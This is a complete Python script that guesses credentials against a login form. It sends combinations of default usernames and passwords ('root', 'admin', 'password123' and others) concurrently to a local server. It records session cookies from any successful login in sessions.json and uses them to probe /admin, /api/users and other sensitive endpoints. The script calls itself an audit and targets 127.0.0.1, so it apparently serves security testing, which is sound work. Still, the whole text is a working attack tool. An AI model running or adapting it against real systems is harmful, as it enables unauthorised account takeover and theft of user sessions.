import asyncio
import aiohttp
import json
import time

BASE_URL = "http://127.0.0.1:8080"
LOGIN_URL = f"{BASE_URL}/login"
MAX_CONCURRENCY = 10

SENSITIVE_ENDPOINTS = [
    "/dashboard",
    "/admin",
    "/settings",
    "/api/users",
    "/profile"
]

async def test_credentials(session, url, username, password, semaphore):
    async with semaphore:
        payload = {"username": username, "password": password}
        start_time = time.time()
        
        try:
            async with session.post(url, data=payload) as response:
                duration = time.time() - start_time
                status = response.status
                
                if status == 200:
                    try:
                        data = await response.json()
                    except Exception:
                        data = {}
                        
                    session_cookie = response.cookies.get("session_id")
                    print(f"[+] SUCCESS: {username}:{password} (Status: {status}, Time: {duration:.3f}s)")
                    
                    return {
                        "username": username,
                        "password": password,
                        "session_id": str(session_cookie.value) if session_cookie else "Captured",
                        "response_data": data
                    }
                else:
                    print(f"[-] Failed: {username}:{password} (Status: {status}, Time: {duration:.3f}s)")
                    
        except Exception as e:
            print(f"[!] Connection error testing {username}:{password} -> {e}")
            
        return None

async def crawl_endpoints(session, base_url, cookies):
    print(f"\n[*] Starting Post-Authentication Endpoint Crawler...")
    tasks = [probe_endpoint(session, f"{base_url}{ep}", cookies) for ep in SENSITIVE_ENDPOINTS]
    await asyncio.gather(*tasks)

async def probe_endpoint(session, url, cookies):
    try:
        async with session.get(url, cookies=cookies) as response:
            status = response.status
            if status == 200:
                print(f"[ACCESS GRANTED] {url} (Status: {status})")
            elif status in [401, 403]:
                print(f"[RESTRICTED]     {url} (Status: {status})")
            else:
                print(f"[NOT FOUND/OTHER] {url} (Status: {status})")
    except Exception as e:
        print(f"[!] Error probing {url} -> {e}")

async def main():
    usernames = ["root", "admin", "guest"]
    passwords = ["password123", "admin123", "secret", "guest", "test", "123456", "welcome"]
    
    semaphore = asyncio.Semaphore(MAX_CONCURRENCY)
    
    print(f"[*] Starting asynchronous audit on {LOGIN_URL}")
    print(f"[*] Concurrency Limit: {MAX_CONCURRENCY} | Total Payload Combinations: {len(usernames) * len(passwords)}")
    
    start_global = time.time()

    async with aiohttp.ClientSession() as session:
        tasks = [test_credentials(session, LOGIN_URL, user, pwd, semaphore) for user in usernames for pwd in passwords]
        results = await asyncio.gather(*tasks)
        
    valid_logins = [r for r in results if r is not None]
    
    if valid_logins:
        with open("sessions.json", "w") as f:
            json.dump(valid_logins, f, indent=4)
        print(f"\n[+] Successfully saved {len(valid_logins)} session(s) to sessions.json")
        
        first_session = valid_logins[0]
        cookie_jar = {"session_id": first_session["session_id"]} if first_session["session_id"] != "Captured" else {}
        
        async with aiohttp.ClientSession() as crawl_session:
            await crawl_endpoints(crawl_session, BASE_URL, cookie_jar)
    else:
        print("\n[-] No valid credentials discovered during this run.")
        
    print(f"\n[*] Total execution time: {time.time() - start_global:.2f} seconds.")

if __name__ == "__main__":
    asyncio.run(main())
